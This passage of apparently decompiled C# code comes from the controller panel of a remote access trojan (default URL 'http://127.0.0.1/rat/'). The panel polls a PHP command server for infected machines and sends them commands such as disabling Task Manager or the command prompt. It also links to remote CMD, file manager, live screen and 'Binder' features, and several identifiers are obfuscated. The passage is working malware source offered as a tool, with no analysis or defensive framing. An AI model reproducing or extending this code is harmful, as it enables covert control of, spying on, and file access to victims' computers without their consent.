        EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem3_Click);
        if (this._ToolStripMenuItem3 != null)
          this._ToolStripMenuItem3.Click -= eventHandler;
        this._ToolStripMenuItem3 = value;
        if (this._ToolStripMenuItem3 == null)
          return;
        this._ToolStripMenuItem3.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RenameFileToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RenameFileToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RenameFileToolStripMenuItem_Click);
        if (this._RenameFileToolStripMenuItem != null)
          this._RenameFileToolStripMenuItem.Click -= eventHandler;
        this._RenameFileToolStripMenuItem = value;
        if (this._RenameFileToolStripMenuItem == null)
          return;
        this._RenameFileToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ToolStripMenuItem4
    {
      [DebuggerNonUserCode] get => this._ToolStripMenuItem4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem4_Click);
        if (this._ToolStripMenuItem4 != null)
          this._ToolStripMenuItem4.Click -= eventHandler;
        this._ToolStripMenuItem4 = value;
        if (this._ToolStripMenuItem4 == null)
          return;
        this._ToolStripMenuItem4.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ToolStripMenuItem5
    {
      [DebuggerNonUserCode] get => this._ToolStripMenuItem5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ToolStripMenuItem5_Click);
        if (this._ToolStripMenuItem5 != null)
          this._ToolStripMenuItem5.Click -= eventHandler;
        this._ToolStripMenuItem5 = value;
        if (this._ToolStripMenuItem5 == null)
          return;
        this._ToolStripMenuItem5.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem UpdateToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._UpdateToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.UpdateToolStripMenuItem_Click);
        if (this._UpdateToolStripMenuItem != null)
          this._UpdateToolStripMenuItem.Click -= eventHandler;
        this._UpdateToolStripMenuItem = value;
        if (this._UpdateToolStripMenuItem == null)
          return;
        this._UpdateToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ExtraToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ExtraToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ExtraToolStripMenuItem = value;
    }

    internal virtual ToolStripMenuItem BinderToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._BinderToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.BinderToolStripMenuItem_Click);
        if (this._BinderToolStripMenuItem != null)
          this._BinderToolStripMenuItem.Click -= eventHandler;
        this._BinderToolStripMenuItem = value;
        if (this._BinderToolStripMenuItem == null)
          return;
        this._BinderToolStripMenuItem.Click += eventHandler;
      }
    }

    public object GetData() => (object) new WebClient().DownloadString(this.fvgrSc7fMzt32at3 + "data.php?action=read");

    [DllImport("kernel32", EntryPoint = "WritePrivateProfileStringW", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int WritePrivateProfileString(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpApplicationName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpKeyName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName);

    [DllImport("kernel32", EntryPoint = "GetPrivateProfileStringW", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int GetPrivateProfileString(
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpApplicationName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpKeyName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpDefault,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpReturnedString,
      int nSize,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName);

    public string INIRead(string INIPath, string SectionName, string KeyName, string DefaultValue)
    {
      string lpReturnedString = Strings.Space(1024);
      int privateProfileString = program.GetPrivateProfileString(ref SectionName, ref KeyName, ref DefaultValue, ref lpReturnedString, lpReturnedString.Length, ref INIPath);
      return privateProfileString <= 0 ? "" : lpReturnedString.Substring(0, privateProfileString);
    }

    public string INIRead(string INIPath, string SectionName, string KeyName) => this.INIRead(INIPath, SectionName, KeyName, "");

    public string INIRead(string INIPath, string SectionName) => this.INIRead(INIPath, SectionName, (string) null, "");

    public string INIRead(string INIPath) => this.INIRead(INIPath, (string) null, (string) null, "");

    public void INIWrite(string INIPath, string SectionName, string KeyName, string TheValue) => program.WritePrivateProfileString(ref SectionName, ref KeyName, ref TheValue, ref INIPath);

    public void INIDelete(string INIPath, string SectionName, string KeyName)
    {
      ref string local1 = ref SectionName;
      ref string local2 = ref KeyName;
      string str = (string) null;
      ref string local3 = ref str;
      ref string local4 = ref INIPath;
      program.WritePrivateProfileString(ref local1, ref local2, ref local3, ref local4);
    }

    public void INIDelete(string INIPath, string SectionName)
    {
      ref string local1 = ref SectionName;
      string str1 = (string) null;
      ref string local2 = ref str1;
      string str2 = (string) null;
      ref string local3 = ref str2;
      ref string local4 = ref INIPath;
      program.WritePrivateProfileString(ref local1, ref local2, ref local3, ref local4);
    }

    public object DeleteData() => (object) new WebClient().DownloadString(this.fvgrSc7fMzt32at3 + "data.php?action=delete");

    public bool ConnectionAvailable(string strServer)
    {
      bool flag;
      try
      {
        HttpWebResponse response = (HttpWebResponse) ((HttpWebRequest) WebRequest.Create(strServer)).GetResponse();
        if (HttpStatusCode.OK == response.StatusCode)
        {
          response.Close();
          flag = true;
        }
        else
        {
          response.Close();
          flag = false;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public object GetFlag(string country)
    {
      string Left = country;
      int num;
      if (Operators.CompareString(Left, "afghanistan", false) == 0)
        num = 0;
      else if (Operators.CompareString(Left, "albania", false) == 0)
        num = 1;
      else if (Operators.CompareString(Left, "algeria", false) == 0)
        num = 2;
      else if (Operators.CompareString(Left, "american samoa", false) == 0)
        num = 3;
      else if (Operators.CompareString(Left, "andorra", false) == 0)
        num = 4;
      else if (Operators.CompareString(Left, "angola", false) == 0)
        num = 5;
      else if (Operators.CompareString(Left, "anguilla", false) == 0)
        num = 6;
      else if (Operators.CompareString(Left, "antigua and barbuda", false) == 0)
        num = 7;
      else if (Operators.CompareString(Left, "argentina", false) == 0)
        num = 8;
      else if (Operators.CompareString(Left, "armenia", false) == 0)
        num = 9;
      else if (Operators.CompareString(Left, "aruba", false) == 0)
        num = 10;
      else if (Operators.CompareString(Left, "australia", false) == 0)
        num = 11;
      else if (Operators.CompareString(Left, "austria", false) == 0)
        num = 12;
      else if (Operators.CompareString(Left, "azerbaijan", false) == 0)
        num = 13;
      else if (Operators.CompareString(Left, "bahamas", false) == 0)
        num = 14;
      else if (Operators.CompareString(Left, "bahrain", false) == 0)
        num = 15;
      else if (Operators.CompareString(Left, "bangladesh", false) == 0)
        num = 16;
      else if (Operators.CompareString(Left, "barbados", false) == 0)
        num = 17;
      else if (Operators.CompareString(Left, "belarus", false) == 0)
        num = 18;
      else if (Operators.CompareString(Left, "belgium", false) == 0)
        num = 19;
      else if (Operators.CompareString(Left, "belize", false) == 0)
        num = 20;
      else if (Operators.CompareString(Left, "benin", false) == 0)
        num = 21;
      else if (Operators.CompareString(Left, "bermuda", false) == 0)
        num = 22;
      else if (Operators.CompareString(Left, "bhutan", false) == 0)
        num = 23;
      else if (Operators.CompareString(Left, "bolivia", false) == 0)
        num = 24;
      else if (Operators.CompareString(Left, "bosnia", false) == 0)
        num = 25;
      else if (Operators.CompareString(Left, "botswana", false) == 0)
        num = 26;
      else if (Operators.CompareString(Left, "brazil", false) == 0)
        num = 27;
      else if (Operators.CompareString(Left, "british virgin islands", false) == 0)
        num = 28;
      else if (Operators.CompareString(Left, "brunei", false) == 0)
        num = 29;
      else if (Operators.CompareString(Left, "bulgaria", false) == 0)
        num = 30;
      else if (Operators.CompareString(Left, "burkina faso", false) == 0)
        num = 31;
      else if (Operators.CompareString(Left, "burundi", false) == 0)
        num = 32;
      else if (Operators.CompareString(Left, "cambodia", false) == 0)
        num = 33;
      else if (Operators.CompareString(Left, "cameroon", false) == 0)
        num = 34;
      else if (Operators.CompareString(Left, "canada", false) == 0)
        num = 35;
      else if (Operators.CompareString(Left, "cape verde", false) == 0)
        num = 36;
      else if (Operators.CompareString(Left, "cayman islands", false) == 0)
        num = 37;
      else if (Operators.CompareString(Left, "central african republic", false) == 0)
        num = 38;
      else if (Operators.CompareString(Left, "chad", false) == 0)
        num = 39;
      else if (Operators.CompareString(Left, "chile", false) == 0)
        num = 40;
      else if (Operators.CompareString(Left, "china", false) == 0)
        num = 41;
      else if (Operators.CompareString(Left, "christmas island", false) == 0)
        num = 42;
      else if (Operators.CompareString(Left, "colombia", false) == 0)
        num = 43;
      else if (Operators.CompareString(Left, "comoros", false) == 0)
        num = 44;
      else if (Operators.CompareString(Left, "cook islands", false) == 0)
        num = 45;
      else if (Operators.CompareString(Left, "costa rica", false) == 0)
        num = 46;
      else if (Operators.CompareString(Left, "croatia", false) == 0)
        num = 47;
      else if (Operators.CompareString(Left, "cuba", false) == 0)
        num = 48;
      else if (Operators.CompareString(Left, "cyprus northern", false) == 0)
        num = 49;
      else if (Operators.CompareString(Left, "cyprus", false) == 0)
        num = 50;
      else if (Operators.CompareString(Left, "czech republic", false) == 0)
        num = 51;
      else if (Operators.CompareString(Left, "côte d'ivoire", false) == 0)
        num = 52;
      else if (Operators.CompareString(Left, "democratic republic of the c ngo", false) == 0)
        num = 53;
      else if (Operators.CompareString(Left, "denmark", false) == 0)
        num = 54;
      else if (Operators.CompareString(Left, "djibouti", false) == 0)
        num = 55;
      else if (Operators.CompareString(Left, "dominica", false) == 0)
        num = 56;
      else if (Operators.CompareString(Left, "dominican_republic", false) == 0)
        num = 57;
      else if (Operators.CompareString(Left, "ecuador", false) == 0)
        num = 58;
      else if (Operators.CompareString(Left, "egypt", false) == 0)
        num = 59;
      else if (Operators.CompareString(Left, "el salvador", false) == 0)
        num = 60;
      else if (Operators.CompareString(Left, "equatorial guinea", false) == 0)
        num = 61;
      else if (Operators.CompareString(Left, "eritrea", false) == 0)
        num = 62;
      else if (Operators.CompareString(Left, "estonia", false) == 0)
        num = 63;
      else if (Operators.CompareString(Left, "ethiopia", false) == 0)
        num = 64;
      else if (Operators.CompareString(Left, "falkland islands", false) == 0)
        num = 65;
      else if (Operators.CompareString(Left, "faroe islands", false) == 0)
        num = 66;
      else if (Operators.CompareString(Left, "fiji", false) == 0)
        num = 67;
      else if (Operators.CompareString(Left, "finland", false) == 0)
        num = 68;
      else if (Operators.CompareString(Left, "france", false) == 0)
        num = 69;
      else if (Operators.CompareString(Left, "french polynesia", false) == 0)
        num = 70;
      else if (Operators.CompareString(Left, "gabon", false) == 0)
        num = 71;
      else if (Operators.CompareString(Left, "gambia", false) == 0)
        num = 72;
      else if (Operators.CompareString(Left, "georgia", false) == 0)
        num = 73;
      else if (Operators.CompareString(Left, "germany", false) == 0)
        num = 74;
      else if (Operators.CompareString(Left, "ghana", false) == 0)
        num = 75;
      else if (Operators.CompareString(Left, "gibraltar", false) == 0)
        num = 76;
      else if (Operators.CompareString(Left, "greece", false) == 0)
        num = 77;
      else if (Operators.CompareString(Left, "greenland", false) == 0)
        num = 78;
      else if (Operators.CompareString(Left, "grenada", false) == 0)
        num = 79;
      else if (Operators.CompareString(Left, "guam", false) == 0)
        num = 80;
      else if (Operators.CompareString(Left, "guatemala", false) == 0)
        num = 81;
      else if (Operators.CompareString(Left, "guinea bissau", false) == 0)
        num = 82;
      else if (Operators.CompareString(Left, "guinea", false) == 0)
        num = 83;
      else if (Operators.CompareString(Left, "guyana", false) == 0)
        num = 84;
      else if (Operators.CompareString(Left, "haiti", false) == 0)
        num = 85;
      else if (Operators.CompareString(Left, "honduras", false) == 0)
        num = 86;
      else if (Operators.CompareString(Left, "hong kong", false) == 0)
        num = 87;
      else if (Operators.CompareString(Left, "hungary", false) == 0)
        num = 88;
      else if (Operators.CompareString(Left, "iceland", false) == 0)
        num = 89;
      else if (Operators.CompareString(Left, "india", false) == 0)
        num = 90;
      else if (Operators.CompareString(Left, "indonesia", false) == 0)
        num = 91;
      else if (Operators.CompareString(Left, "iran", false) == 0)
        num = 92;
      else if (Operators.CompareString(Left, "iraq", false) == 0)
        num = 93;
      else if (Operators.CompareString(Left, "ireland", false) == 0)
        num = 94;
      else if (Operators.CompareString(Left, "israel", false) == 0)
        num = 95;
      else if (Operators.CompareString(Left, "italy", false) == 0)
        num = 96;
      else if (Operators.CompareString(Left, "jamaica", false) == 0)
        num = 97;
      else if (Operators.CompareString(Left, "japan", false) == 0)
        num = 98;
      else if (Operators.CompareString(Left, "jordan", false) == 0)
        num = 99;
      else if (Operators.CompareString(Left, "kazakhstan", false) == 0)
        num = 100;
      else if (Operators.CompareString(Left, "kenya", false) == 0)
        num = 101;
      else if (Operators.CompareString(Left, "kiribati", false) == 0)
        num = 102;
      else if (Operators.CompareString(Left, "kuwait", false) == 0)
        num = 103;
      else if (Operators.CompareString(Left, "kyrgyzstan", false) == 0)
        num = 104;
      else if (Operators.CompareString(Left, "laos", false) == 0)
        num = 105;
      else if (Operators.CompareString(Left, "latvia", false) == 0)
        num = 106;
      else if (Operators.CompareString(Left, "lebanon", false) == 0)
        num = 107;
      else if (Operators.CompareString(Left, "lesotho", false) == 0)
        num = 108;
      else if (Operators.CompareString(Left, "liberia", false) == 0)
        num = 109;
      else if (Operators.CompareString(Left, "libya", false) == 0)
        num = 110;
      else if (Operators.CompareString(Left, "liechtenstein", false) == 0)
        num = 111;
      else if (Operators.CompareString(Left, "lithuania", false) == 0)
        num = 112;
      else if (Operators.CompareString(Left, "luxembourg", false) == 0)
        num = 113;
      else if (Operators.CompareString(Left, "macao", false) == 0)
        num = 114;
      else if (Operators.CompareString(Left, "macedonia", false) == 0)
        num = 115;
      else if (Operators.CompareString(Left, "madagascar", false) == 0)
        num = 116;
      else if (Operators.CompareString(Left, "malawi", false) == 0)
        num = 117;
      else if (Operators.CompareString(Left, "malaysia", false) == 0)
        num = 118;
      else if (Operators.CompareString(Left, "maldives", false) == 0)
        num = 119;
      else if (Operators.CompareString(Left, "mali", false) == 0)
        num = 120;
      else if (Operators.CompareString(Left, "malta", false) == 0)
        num = 121;
      else if (Operators.CompareString(Left, "marshall islands", false) == 0)
        num = 122;
      else if (Operators.CompareString(Left, "martinique", false) == 0)
        num = 123;
      else if (Operators.CompareString(Left, "mauritania", false) == 0)
        num = 124;
      else if (Operators.CompareString(Left, "mauritius", false) == 0)
        num = 125;
      else if (Operators.CompareString(Left, "mexico", false) == 0)
        num = 126;
      else if (Operators.CompareString(Left, "micronesia", false) == 0)
        num = (int) sbyte.MaxValue;
      else if (Operators.CompareString(Left, "moldova", false) == 0)
        num = 128;
      else if (Operators.CompareString(Left, "monaco", false) == 0)
        num = 129;
      else if (Operators.CompareString(Left, "mongolia", false) == 0)
        num = 130;
      else if (Operators.CompareString(Left, "montserrat", false) == 0)
        num = 131;
      else if (Operators.CompareString(Left, "morocco", false) == 0)
        num = 132;
      else if (Operators.CompareString(Left, "mozambique", false) == 0)
        num = 133;
      else if (Operators.CompareString(Left, "myanmar", false) == 0)
        num = 134;
      else if (Operators.CompareString(Left, "namibia", false) == 0)
        num = 135;
      else if (Operators.CompareString(Left, "nauru", false) == 0)
        num = 136;
      else if (Operators.CompareString(Left, "nepal", false) == 0)
        num = 137;
      else if (Operators.CompareString(Left, "netherlands antilles", false) == 0)
        num = 138;
      else if (Operators.CompareString(Left, "netherlands", false) == 0)
        num = 139;
      else if (Operators.CompareString(Left, "new zealand", false) == 0)
        num = 140;
      else if (Operators.CompareString(Left, "nicaragua", false) == 0)
        num = 141;
      else if (Operators.CompareString(Left, "niger", false) == 0)
        num = 142;
      else if (Operators.CompareString(Left, "nigeria", false) == 0)
        num = 143;
      else if (Operators.CompareString(Left, "niue", false) == 0)
        num = 144;
      else if (Operators.CompareString(Left, "norfolk island", false) == 0)
        num = 145;
      else if (Operators.CompareString(Left, "north korea", false) == 0)
        num = 146;
      else if (Operators.CompareString(Left, "norway", false) == 0)
        num = 147;
      else if (Operators.CompareString(Left, "oman", false) == 0)
        num = 148;
      else if (Operators.CompareString(Left, "pakistan", false) == 0)
        num = 149;
      else if (Operators.CompareString(Left, "palau", false) == 0)
        num = 150;
      else if (Operators.CompareString(Left, "panama", false) == 0)
        num = 151;
      else if (Operators.CompareString(Left, "papua new guinea", false) == 0)
        num = 152;
      else if (Operators.CompareString(Left, "paraguay", false) == 0)
        num = 153;
      else if (Operators.CompareString(Left, "peru", false) == 0)
        num = 154;
      else if (Operators.CompareString(Left, "philippines", false) == 0)
        num = 155;
      else if (Operators.CompareString(Left, "pitcairn islands", false) == 0)
        num = 156;
      else if (Operators.CompareString(Left, "poland", false) == 0)
        num = 157;
      else if (Operators.CompareString(Left, "portugal", false) == 0)
        num = 158;
      else if (Operators.CompareString(Left, "puerto rico", false) == 0)
        num = 159;
      else if (Operators.CompareString(Left, "qatar", false) == 0)
        num = 160;
      else if (Operators.CompareString(Left, "republic of the congo", false) == 0)
        num = 161;
      else if (Operators.CompareString(Left, "romania", false) == 0)
        num = 162;
      else if (Operators.CompareString(Left, "russian federation", false) == 0)
        num = 163;
      else if (Operators.CompareString(Left, "rwanda", false) == 0)
        num = 164;
      else if (Operators.CompareString(Left, "saint kitts and nevis", false) == 0)
        num = 165;
      else if (Operators.CompareString(Left, "saint lucia", false) == 0)
        num = 166;
      else if (Operators.CompareString(Left, "saint pierre", false) == 0)
        num = 167;
      else if (Operators.CompareString(Left, "saint vicent and the grenadines", false) == 0)
        num = 168;
      else if (Operators.CompareString(Left, "samoa", false) == 0)
        num = 169;
      else if (Operators.CompareString(Left, "san marino", false) == 0)
        num = 170;
      else if (Operators.CompareString(Left, "sao tomé and príncipe", false) == 0)
        num = 171;
      else if (Operators.CompareString(Left, "saudi arabia", false) == 0)
        num = 172;
      else if (Operators.CompareString(Left, "senegal", false) == 0)
        num = 173;
      else if (Operators.CompareString(Left, "serbia and montenegro", false) == 0)
        num = 174;
      else if (Operators.CompareString(Left, "seychelles", false) == 0)
        num = 175;
      else if (Operators.CompareString(Left, "sierra leone", false) == 0)
        num = 176;
      else if (Operators.CompareString(Left, "singapore", false) == 0)
        num = 177;
      else if (Operators.CompareString(Left, "slovakia", false) == 0)
        num = 178;
      else if (Operators.CompareString(Left, "slovenia", false) == 0)
        num = 179;
      else if (Operators.CompareString(Left, "soloman islands", false) == 0)
        num = 180;
      else if (Operators.CompareString(Left, "somalia", false) == 0)
        num = 181;
      else if (Operators.CompareString(Left, "south africa", false) == 0)
        num = 182;
      else if (Operators.CompareString(Left, "south georgia", false) == 0)
        num = 183;
      else if (Operators.CompareString(Left, "south korea", false) == 0)
        num = 184;
      else if (Operators.CompareString(Left, "soviet union", false) == 0)
        num = 185;
      else if (Operators.CompareString(Left, "spain", false) == 0)
        num = 186;
      else if (Operators.CompareString(Left, "sri lanka", false) == 0)
        num = 187;
      else if (Operators.CompareString(Left, "sudan", false) == 0)
        num = 188;
      else if (Operators.CompareString(Left, "suriname", false) == 0)
        num = 189;
      else if (Operators.CompareString(Left, "swaziland", false) == 0)
        num = 190;
      else if (Operators.CompareString(Left, "sweden", false) == 0)
        num = 191;
      else if (Operators.CompareString(Left, "switzerland", false) == 0)
        num = 192;
      else if (Operators.CompareString(Left, "syria", false) == 0)
        num = 193;
      else if (Operators.CompareString(Left, "taiwan", false) == 0)
        num = 194;
      else if (Operators.CompareString(Left, "tajikistan", false) == 0)
        num = 195;
      else if (Operators.CompareString(Left, "tanzania", false) == 0)
        num = 196;
      else if (Operators.CompareString(Left, "thailand", false) == 0)
        num = 197;
      else if (Operators.CompareString(Left, "tibet", false) == 0)
        num = 198;
      else if (Operators.CompareString(Left, "timor-leste", false) == 0)
        num = 199;
      else if (Operators.CompareString(Left, "togo", false) == 0)
        num = 200;
      else if (Operators.CompareString(Left, "tonga", false) == 0)
        num = 201;
      else if (Operators.CompareString(Left, "trinidad_and_tobago", false) == 0)
        num = 202;
      else if (Operators.CompareString(Left, "tunisia", false) == 0)
        num = 203;
      else if (Operators.CompareString(Left, "turkey", false) == 0)
        num = 204;
      else if (Operators.CompareString(Left, "turkmenistan", false) == 0)
        num = 205;
      else if (Operators.CompareString(Left, "turks_and_caicos_islands", false) == 0)
        num = 206;
      else if (Operators.CompareString(Left, "tuvalu", false) == 0)
        num = 207;
      else if (Operators.CompareString(Left, "uae", false) == 0)
        num = 208;
      else if (Operators.CompareString(Left, "uganda", false) == 0)
        num = 209;
      else if (Operators.CompareString(Left, "ukraine", false) == 0)
        num = 210;
      else if (Operators.CompareString(Left, "united kingdom", false) == 0)
        num = 211;
      else if (Operators.CompareString(Left, "united states of america", false) == 0)
        num = 212;
      else if (Operators.CompareString(Left, "uruguay", false) == 0)
        num = 213;
      else if (Operators.CompareString(Left, "us virgin islands", false) == 0)
        num = 214;
      else if (Operators.CompareString(Left, "uzbekistan", false) == 0)
        num = 215;
      else if (Operators.CompareString(Left, "vanuatu", false) == 0)
        num = 216;
      else if (Operators.CompareString(Left, "vatican city", false) == 0)
        num = 217;
      else if (Operators.CompareString(Left, "venezuela", false) == 0)
        num = 218;
      else if (Operators.CompareString(Left, "vietnam", false) == 0)
        num = 219;
      else if (Operators.CompareString(Left, "wallis and futuna", false) == 0)
        num = 220;
      else if (Operators.CompareString(Left, "yemen", false) == 0)
        num = 221;
      else if (Operators.CompareString(Left, "zambia", false) == 0)
        num = 222;
      else if (Operators.CompareString(Left, "zimbabwe", false) == 0)
        num = 223;
      return (object) checked (num + 1);
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        this.ListView1.BackgroundImage = (Image) new Bitmap(Application.StartupPath + "/other/background.jpg");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.ListView1.Columns[5].Width = 0;
      this.ListView1.Columns[5].Width = 100;
      if (MyProject.Computer.FileSystem.FileExists(Application.StartupPath + "/Settings.ini"))
      {
        this.TextBox1.Text = this.INIRead(Conversions.ToString(this.sPath), "Settings", "DefaultURL");
        MyProject.Forms.settings.TextBox2.Text = this.INIRead(Conversions.ToString(this.sPath), "Settings", "DefaultURL");
        this.checkusers.Interval = Conversions.ToInteger(this.INIRead(Conversions.ToString(this.sPath), "Settings", "RefreshListEverySec"));
        MyProject.Forms.settings.TextBox1.Text = this.INIRead(Conversions.ToString(this.sPath), "Settings", "RefreshListEverySec");
        MyProject.Forms.chat.refrsh.Interval = Conversions.ToInteger(this.INIRead(Conversions.ToString(this.sPath), "Settings", "ChatInterval"));
        MyProject.Forms.settings.TextBox3.Text = this.INIRead(Conversions.ToString(this.sPath), "Settings", "ChatInterval");
        MyProject.Forms.filem.reload.Interval = Conversions.ToInteger(this.INIRead(Conversions.ToString(this.sPath), "Settings", "FileManagerInterval"));
        MyProject.Forms.response.getit.Interval = Conversions.ToInteger(this.INIRead(Conversions.ToString(this.sPath), "Settings", "ResponseInterval"));
        MyProject.Forms.desktop.loader.Interval = Conversions.ToInteger(this.INIRead(Conversions.ToString(this.sPath), "Settings", "LiveScreenInterval"));
        MyProject.Forms.chat.refrsh.Stop();
        this.checkusers.Stop();
        MyProject.Forms.filem.reload.Stop();
        MyProject.Forms.response.getit.Stop();
        MyProject.Forms.desktop.loader.Stop();
      }
      else
      {
        this.INIWrite(Conversions.ToString(this.sPath), "Settings", "DefaultURL", "http://127.0.0.1/rat/");
        this.INIWrite(Conversions.ToString(this.sPath), "Settings", "RefreshListEverySec", "5000");
        this.INIWrite(Conversions.ToString(this.sPath), "Settings", "ChatInterval", "1000");
        this.INIWrite(Conversions.ToString(this.sPath), "Settings", "FileManagerInterval", "5000");
        this.INIWrite(Conversions.ToString(this.sPath), "Settings", "ResponseInterval", "5000");
        this.INIWrite(Conversions.ToString(this.sPath), "Settings", "LiveScreenInterval", "24");
      }
    }

    public object OnlineUsers()
    {
      try
      {
        string Expression1 = new WebClient().DownloadString(this.fvgrSc7fMzt32at3 + "/users.php?action=read");
        this.pbhaguDAhV2jtD75g4gn3D4 = Conversions.ToInteger("0");
        this.ListView1.Items.Clear();
        string[] strArray1 = Strings.Split(Expression1, "\r\n");
        int index = 0;
        while (index < strArray1.Length)
        {
          string Expression2 = strArray1[index];
          if (Expression2.ToString().Contains("|"))
          {
            string[] strArray2 = Strings.Split(Expression2, "|");
            this.ListView1.Items.Add(strArray2[0]);
            this.ListView1.Items[this.pbhaguDAhV2jtD75g4gn3D4].SubItems.Add(strArray2[1]);
            this.ListView1.Items[this.pbhaguDAhV2jtD75g4gn3D4].SubItems.Add(strArray2[2]);
            this.ListView1.Items[this.pbhaguDAhV2jtD75g4gn3D4].SubItems.Add(strArray2[3]);
            this.ListView1.Items[this.pbhaguDAhV2jtD75g4gn3D4].SubItems.Add(strArray2[4]);
            this.ListView1.Items[this.pbhaguDAhV2jtD75g4gn3D4].SubItems.Add(strArray2[5]);
            this.pbhaguDAhV2jtD75g4gn3D4 = checked ((int) Math.Round(unchecked (Conversion.Val((object) this.pbhaguDAhV2jtD75g4gn3D4) + Conversion.Val("1"))));
          }
          this.ToolStripStatusLabel3.Text = "Online : " + Conversions.ToString(this.ListView1.Items.Count);
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        this.checkusers.Stop();
        this.connected = (object) "0";
        this.TextBox1.ReadOnly = false;
        int num = (int) Interaction.MsgBox((object) "Invalid URL!", MsgBoxStyle.Exclamation);
        ProjectData.ClearProjectError();
      }
      object obj;
      return obj;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
      this.TextBox1.ReadOnly = true;
      this.connected = (object) "1";
      this.fvgrSc7fMzt32at3 = this.TextBox1.Text;
      this.ToolStripStatusLabel1.Text = "Status : Connected";
      new Thread((ThreadStart) (() => this.OnlineUsers())).Start();
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      this.TextBox1.ReadOnly = false;
      this.ToolStripStatusLabel1.Text = "Status : Not Connected";
      this.connected = (object) "0";
    }

    private void OpenCMDToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        MyProject.Forms.openprogram.Show();
    }

    public object PostData(object data)
    {
      this.fraqCe58F9PvfV2pSval61pAl2gYnx6UwZCC4Q4zFOjWqan2c6d4Q.DownloadString(this.fvgrSc7fMzt32at3 + "/index.php?action=write&data=" + data.ToString());
      object obj;
      return obj;
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      if (!Operators.ConditionalCompareObjectEqual(this.connected, (object) "1", false))
        return;
      new Thread((ThreadStart) (() => this.OnlineUsers())).Start();
    }

    private void Button3_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        new Thread((ThreadStart) (() => this.OnlineUsers())).Start();
    }

    private void DeleteFromListToolStripMenuItem_Click(object sender, EventArgs e)
    {
      new WebClient().DownloadString(this.fvgrSc7fMzt32at3 + "users.php?action=delete&data=" + this.Label1.Text + "|" + this.Label2.Text + "|" + this.Label3.Text + "|" + this.Label4.Text + "|" + this.Label5.Text + "|" + this.Label6.Text);
      new Thread((ThreadStart) (() => this.OnlineUsers())).Start();
    }

    private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        new Thread((ThreadStart) (() => this.OnlineUsers())).Start();
    }

    private void EnableToolStripMenuItem3_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|enabletaskmanager|"));
    }

    private void DisableToolStripMenuItem3_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|disabletaskmanager|"));
    }

    private void EnableToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
        this.PostData((object) (this.Label1.Text + "|enablecmd|"));
    }

    private void DisableToolStripMenuItem2_Click(object sender, EventArgs e)
    {
      if (Operators.ConditionalCompareObjectNotEqual(this.connected, (object) "1", false))
      {
        int num = (int) Interaction.MsgBox((object) "You are not connected!", MsgBoxStyle.Exclamation);
      }
      else
